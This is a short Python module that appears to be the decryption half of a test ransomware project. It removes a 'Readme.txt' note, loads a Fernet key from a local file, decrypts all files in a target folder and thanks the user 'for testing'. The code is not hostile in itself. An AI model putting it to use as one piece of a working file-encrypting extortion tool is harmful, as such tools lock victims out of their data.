from cryptography.fernet import Fernet
from main.constants import const as cs
import os
from main.functions import file_operator as file_opt

def return_Key():
    return open("key.key", "rb").read()

def decrypt_data(items, key):
    a = Fernet(key)
    for item in items:
        # with open(item, "rb") as file:
        #     file_data = file.read()
        file_data = file_opt.read_data(item)

        data = a.decrypt(file_data)

        file_opt.decrypt_data(item, data)

        # with open(item, "wb") as file:
        #     file.write(data)

def execute():
    os.remove(cs.PATH_ENC+"Readme.txt")

    items = os.listdir(cs.PATH_ENC)
    target_path = [cs.PATH_ENC+i for i in items]


    key = return_Key()

    decrypt_data(target_path, key)
    print("Files were decrypted! Thank you for testing!")